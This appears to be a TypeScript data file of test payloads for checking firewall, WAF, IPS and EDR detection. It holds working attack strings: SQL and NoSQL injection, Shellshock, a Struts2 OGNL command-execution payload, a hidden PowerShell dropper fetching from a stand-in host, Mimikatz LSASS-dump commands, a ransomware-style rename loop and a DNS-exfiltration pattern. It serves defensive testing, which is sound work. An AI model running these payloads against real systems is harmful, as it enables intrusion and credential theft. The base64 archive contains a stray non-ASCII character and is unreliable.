
import { TestPayload, TestCategory } from './types';

export const TEST_PAYLOADS: TestPayload[] = [
  // --- NGFW / WAF / IPS ---
  {
    id: 'waf-sqli-01',
    name: 'SQLi: Tautology Bypass',
    description: 'Basic auth bypass attempt using standard SQL tautology.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "' OR 1=1 --",
    expectedBehavior: '403 Forbidden or 406 Not Acceptable'
  },
  {
    id: 'waf-nosql-01',
    name: 'NoSQL: Operator Injection',
    description: 'Attempts to inject MongoDB operators to bypass filters.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: '{"username": {"$ne": null}, "password": {"$gt": ""}}',
    expectedBehavior: 'WAF should block JSON operator patterns'
  },
  {
    id: 'ips-shellshock-01',
    name: 'IPS: Shellshock (CVE-2014-6271)',
    description: 'Simulates Bash environment variable exploitation via User-Agent.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: '() { :; }; echo; /bin/bash -c "echo vulnerable"',
    expectedBehavior: 'NGFW IPS Signature Block'
  },
  {
    id: 'ips-heartbleed-01',
    name: 'IPS: Heartbleed Pattern',
    description: 'Simulates a malformed TLS heartbeat request designed to leak memory.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: '\x18\x03\x02\x00\x03\x01\x40\x00',
    expectedBehavior: 'Protocol Anomaly Detection'
  },
  {
    id: 'ips-struts2-01',
    name: 'IPS: Apache Struts2 OGNL',
    description: 'Simulates a remote code execution attempt using OGNL injection.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: '%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognl=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognl.getExcludedPackageNames().clear()).(#ognl.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#process=@java.lang.Runtime@getRuntime().exec(\'id\')).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
    expectedBehavior: 'IPS Application Layer Filtering'
  },

  // --- VIRUS / MALWARE ---
  {
    id: 'virus-eicar-zip',
    name: 'Virus: Compressed EICAR',
    description: 'EICAR test string inside a ZIP archive. Tests NGFW "Recursive Archive Scanning".',
    category: TestCategory.VIRUS,
    type: 'download',
    targetDevice: 'BOTH',
    content: 'UEsDBAoAAAAAAOCvVlUAAAAAAAAAAAAAAAAIABAAWGVpY2FyLnR4dFVUCQADuX1vXrl9b111eAsAAQT1AQAABBQAAABYNVkhVUAleDRQWlg1NChQXmls3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSStIKlBLAwQKAAAAAADgr1ZVAAAAAAAAAAAAAAAAEAAQAF9fTUFDT1NYL1VUCQADuX1vXrl9b111eAsAAQT1AQAABBQAAABQSwMEFAAIAAgA4K9WVQAAAAAAAAAAAAAAAAsAEABfX01BQ09TWC8uX2VpY2FyLnR4dFVUCQADuX1vXrl9b111eAsAAQT1AQAABBQAAABjYBKm4mCwYJBgsGIKAbIMDAz8DExuKUlFxZn5eXpFCkrGZvpGBiYGRgZGxgYgNqK8iX6ugYGRkaGhgaGBoREIAwA1DAtQSwECFwsAAgAAAAAA4K9WVQAAAAAAAAAAAAAAAAgAGAAAAAAAAAAAAAAAAP0BAABlaWNhci50eHRVVAUAA7l9b111eAsAAQT1AQAABBQAAABQSwECFwsAAgAAAAAA4K9WVQAAAAAAAAAAAAAAAAAQABAAAAAAAAAAAAAAAAD9AgAAX19NQU堅RYL1VUBQADuX1vX11eAsAAQT1AQAABBQAAABQSwECFwsAAQACAAgA4K9WVQAAAAAAAAAAAAAAAAsAGAAAAAAAAAAAAAAAAP0DAABfX01BQ09TWC8uX2VpY2FyLnR4dFVUBQADuX1vX11eAsAAQT1AQAABBQAAABQSwUGAAAAAAMAAwDFAAAA2wQAAAAA',
    expectedBehavior: 'Blocked by NGFW Gateway AV'
  },
  {
    id: 'virus-dropper-mock',
    name: 'Virus: PowerShell Dropper',
    description: 'Simulates a second-stage malware dropper that fetches an executable via TLS.',
    category: TestCategory.VIRUS,
    type: 'script',
    targetDevice: 'EDR',
    content: 'powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://bad-actor.io/payload.ps1\')"',
    expectedBehavior: 'EDR Script Execution Monitoring'
  },

  // --- RANSOMWARE ---
  {
    id: 'ransom-sim-01',
    name: 'Ransomware: File Mass-Rename',
    description: 'Simulates the rapid renaming of files to a ".locked" extension, typical of ransomware.',
    category: TestCategory.RANSOMWARE,
    type: 'script',
    targetDevice: 'EDR',
    content: 'for ($i=1; $i -le 100; $i++) { New-Item -Path "C:\\Temp\\test$i.txt" -ItemType File; Rename-Item -Path "C:\\Temp\\test$i.txt" -NewName "test$i.txt.locked" }',
    expectedBehavior: 'EDR Anti-Ransomware Behavioral Block'
  },

  // --- EDR / ENDPOINT ---
  {
    id: 'edr-cred-01',
    name: 'EDR: Credential Access (LSASS)',
    description: 'Simulates the string pattern used by Mimikatz to dump memory.',
    category: TestCategory.EDR,
    type: 'script',
    targetDevice: 'EDR',
    content: 'privilege::debug sekurlsa::logonpasswords',
    expectedBehavior: 'Immediate EDR isolation or alert'
  },
  {
    id: 'exfil-dns-01',
    name: 'EXFIL: DNS Tunneling',
    description: 'Simulates exfiltrating data via subdomains of a controlled domain.',
    category: TestCategory.EXFIL,
    type: 'network',
    targetDevice: 'NGFW',
    content: 'sensitive-data-chunk-01.exfil.sentinela.internal',
    expectedBehavior: 'DNS filtering or anomaly detection'
  }
];
